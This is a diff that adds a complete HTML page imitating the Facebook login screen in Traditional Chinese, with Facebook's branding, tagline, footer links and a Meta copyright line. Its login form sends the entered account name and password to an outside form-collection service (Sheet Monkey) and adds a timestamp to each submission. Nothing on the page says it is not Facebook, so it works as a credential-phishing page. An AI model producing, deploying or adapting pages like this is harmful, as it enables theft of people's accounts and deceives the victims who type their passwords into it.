@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>facebook login</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #1c1e21;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* 主內容區 */
+    .main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 72px 20px 20px;
+      gap: 60px;
+      max-width: 980px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    /* 左側文字區 */
+    .left {
+      flex: 1;
+      max-width: 500px;
+      padding-right: 32px;
+    }
+
+    .logo {
+      color: #0866ff;
+      font-size: 56px;
+      font-weight: 700;
+      letter-spacing: -1px;
+      margin-bottom: 12px;
+      line-height: 1;
+    }
+
+    .tagline {
+      font-size: 28px;
+      line-height: 32px;
+      font-weight: 400;
+      color: #1c1e21;
+    }
+
+    /* 右側登入卡片 */
+    .right {
+      width: 396px;
+      flex-shrink: 0;
+    }
+
+    .login-card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
+                  0 8px 16px rgba(0, 0, 0, 0.1);
+      padding: 20px 20px 28px;
+      text-align: center;
+    }
+
+    .login-card input {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      color: #1c1e21;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .login-card input:focus {
+      border-color: #0866ff;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+
+    .login-card input::placeholder {
+      color: #8a8d91;
+    }
+
+    .btn-login {
+      width: 100%;
+      background: #0866ff;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: 600;
+      padding: 12px;
+      cursor: pointer;
+      margin-top: 6px;
+      transition: background 0.2s;
+    }
+
+    .btn-login:hover {
+      background: #0655d4;
+    }
+
+    .forgot {
+      display: block;
+      margin: 16px 0 20px;
+      color: #0866ff;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .forgot:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      border-bottom: 1px solid #dadde1;
+      margin: 20px 16px;
+    }
+
+    .btn-create {
+      background: #42b72a;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 17px;
+      font-weight: 600;
+      padding: 14px 16px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-create:hover {
+      background: #36a420;
+    }
+
+    .create-page {
+      margin-top: 28px;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .create-page a {
+      color: #1c1e21;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .create-page a:hover {
+      text-decoration: underline;
+    }
+
+    /* 底部 */
+    footer {
+      background: #fff;
+      padding: 20px 0 40px;
+      border-top: 1px solid #dddfe2;
+      font-size: 12px;
+      color: #8a8d91;
+    }
+
+    .footer-inner {
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    .languages {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-bottom: 10px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #dddfe2;
+    }
+
+    .languages a {
+      color: #8a8d91;
+      text-decoration: none;
+    }
+
+    .languages a:hover {
+      text-decoration: underline;
+    }
+
+    .languages .active {
+      color: #1c1e21;
+    }
+
+    .links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px 16px;
+      margin-bottom: 20px;
+    }
+
+    .links a {
+      color: #8a8d91;
+      text-decoration: none;
+    }
+
+    .links a:hover {
+      text-decoration: underline;
+    }
+
+    .copyright {
+      margin-top: 10px;
+    }
+
+    /* 響應式 */
+    @media (max-width: 900px) {
+      .main {
+        flex-direction: column;
+        gap: 40px;
+        padding-top: 40px;
+        text-align: center;
+      }
+
+      .left {
+        padding-right: 0;
+        max-width: 400px;
+      }
+
+      .logo {
+        font-size: 48px;
+      }
+
+      .tagline {
+        font-size: 24px;
+        line-height: 28px;
+      }
+
+      .right {
+        width: 100%;
+        max-width: 396px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .login-card {
+        padding: 16px;
+      }
+
+      .logo {
+        font-size: 40px;
+      }
+
+      .tagline {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="main">
+
+    <!-- 左側 -->
+    <div class="left">
+      <div class="logo">facebook</div>
+
+      <p class="tagline">
+        Facebook 讓你和親朋好友保持聯繫，
+                隨時分享生活中的點滴。
+      </p>
+    </div>
+
+
+    <!-- 右側 -->
+    <div class="right">
+
+      <div class="login-card">
+
+        <!-- Sheet Monkey 表單 -->
+        <form
+          action="https://api.sheetmonkey.io/form/fCQurdxGCiZ2shJoSffSy4"
+          method="post"
+        >
+
+          <input
+            type="text"
+            name="account"
+            placeholder="帳號"
+            required
+          >
+
+          <input
+            type="text"
+            name="password"
+            placeholder="密碼"
+            required
+          >
+
+          <!-- 自動記錄提交時間 -->
+          <input type="hidden" name="Created" id="created" > <button type="submit" class="btn-login"> 登入 </button> <script> document.querySelector("form").addEventListener("submit", function () { const taiwanTime = new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei", year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false }); document.getElementById("created").value = taiwanTime; }); </script>
+
+        </form>
+
+
+        <a href="#" class="forgot">
+          忘記密碼？
+        </a>
+
+        <div class="divider"></div>
+
+        <button type="button" class="btn-create">
+          建立新帳號
+        </button>
+
+      </div>
+
+
+      <p class="create-page">
+        <a href="#">
+          為名人、品牌或商家建立粉絲專頁。
+        </a>
+      </p>
+
+    </div>
+
+  </div>
+
+
+  <!-- 底部 -->
+  <footer>
+
+    <div class="footer-inner">
+
+      <div class="languages">
+        <a href="#" class="active">中文(台灣)</a>
+        <a href="#">English (US)</a>
+        <a href="#">日本語</a>
+        <a href="#">한국어</a>
+        <a href="#">Español</a>
+        <a href="#">Português (Brasil)</a>
+        <a href="#">Français (France)</a>
+        <a href="#">Deutsch</a>
+        <a href="#">+</a>
+      </div>
+
+
+      <div class="links">
+        <a href="#">註冊</a>
+        <a href="#">登入</a>
+        <a href="#">Messenger</a>
+        <a href="#">Facebook Lite</a>
+        <a href="#">影片</a>
+        <a href="#">Places</a>
+        <a href="#">遊戲</a>
+        <a href="#">Marketplace</a>
+        <a href="#">Meta Pay</a>
+        <a href="#">Meta Store</a>
+        <a href="#">Meta Quest</a>
+        <a href="#">Instagram</a>
+        <a href="#">Threads</a>
+        <a href="#">募款活動</a>
+        <a href="#">服務</a>
+        <a href="#">投票資訊中心</a>
+        <a href="#">隱私政策</a>
+        <a href="#">隱私中心</a>
+        <a href="#">關於</a>
+        <a href="#">建立廣告</a>
+        <a href="#">建立粉絲專頁</a>
+        <a href="#">開發人員</a>
+        <a href="#">工作機會</a>
+        <a href="#">Cookies</a>
+        <a href="#">廣告選擇</a>
+        <a href="#">使用條款</a>
+        <a href="#">說明</a>
+        <a href="#">聯絡上傳與非用戶</a>
+        <a href="#">設定</a>
+        <a href="#">活動紀錄</a>
+      </div>
+
+
+      <div class="copyright">
+        Meta © 2026
+      </div>
+
+    </div>
+
+  </footer>
+
+</body>
+</html>
+```
